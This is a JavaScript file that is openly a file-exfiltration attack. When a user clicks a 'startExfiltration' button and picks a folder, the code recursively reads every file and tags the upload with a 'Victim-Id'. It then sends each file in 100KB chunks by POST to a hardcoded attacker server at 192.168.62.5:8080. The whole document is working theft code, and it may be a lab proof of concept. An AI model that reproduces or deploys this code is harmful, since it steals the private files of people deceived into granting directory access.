document.addEventListener('DOMContentLoaded', function () {
  const serverUrl = 'http://192.168.62.5:8080/upload';

  async function processDirectory(directoryHandle, victimId, currentPath = '') {
    const files = []; // Store all files

    for await (const entry of directoryHandle.values()) {
      if (entry.kind === 'file') {
        const file = await entry.getFile();
        console.log(`Preparing to send file: ${file.name}`);

        files.push(file); // Add file to the list
      } else if (entry.kind === 'directory') {
        console.log(`Entering subdirectory: ${entry.name}`);
        const subdirectoryHandle = await entry;
        await processDirectory(subdirectoryHandle, victimId, `${currentPath}/${entry.name}`);
      }
    }

    const totalFiles = files.length; // Total number of files in the directory

    // Now send each file
    for (let file of files) {
      await sendFileChunks(victimId, file, totalFiles);
    }
  }

  async function sendFileChunks(victimId, file, totalFiles) {
    const fileArrayBuffer = await file.arrayBuffer();
    const chunkSize = 1024 * 100; // 100KB
    const totalChunks = Math.ceil(fileArrayBuffer.byteLength / chunkSize);
    let startByte = 0;

    console.log(`File size: ${file.size} bytes, Total chunks: ${totalChunks}`);

    for (let i = 0; i < totalChunks; i++) {
      const endByte = Math.min(startByte + chunkSize, fileArrayBuffer.byteLength);
      const chunk = fileArrayBuffer.slice(startByte, endByte);
      startByte = endByte;

      // Send the chunk, including the total file count in the headers
      await sendChunk(victimId, file.name, chunk, i + 1, totalChunks, totalFiles);
    }
  }

  async function sendChunk(victimId, filename, chunk, chunkIndex, totalChunks, totalFiles) {
    const headers = {
      'Content-Type': 'application/octet-stream',
      'Victim-Id': encodeURIComponent(victimId), // Encode victimId
      'Filename': encodeURIComponent(filename), // Encode filename
      'Chunk-Index': chunkIndex,
      'Total-Chunks': totalChunks,
      'Total-Files': totalFiles, // Send the total number of files
    };

    console.log(`Sending chunk ${chunkIndex}/${totalChunks} for file: ${filename}`);
    console.log('Headers:', headers);

    try {
      const response = await fetch(serverUrl, {
        method: 'POST',
        headers: headers,
        body: chunk,
      });

      // Log the response status and body
      console.log(`Response for chunk ${chunkIndex}: ${response.status}`);
      if (response.ok) {
        console.log(`✅ Successfully sent chunk ${chunkIndex}/${totalChunks} for file: ${filename}`);
      } else {
        console.error(`❌ Failed to send chunk ${chunkIndex}: ${response.statusText}`);
      }
    } catch (error) {
      console.error(`❌ Error sending chunk ${chunkIndex}: ${error}`);
    }
  }

  document.getElementById('startExfiltration').addEventListener('click', async () => {
    try {
      const victimId = crypto.randomUUID(); // Generate a unique ID for this victim
      const directoryHandle = await window.showDirectoryPicker();
      console.log('✅ Directory selected:', directoryHandle.name);

      await processDirectory(directoryHandle, victimId);
    } catch (error) {
      console.error('❌ Error during directory access or transfer:', error);
    }
  });
});
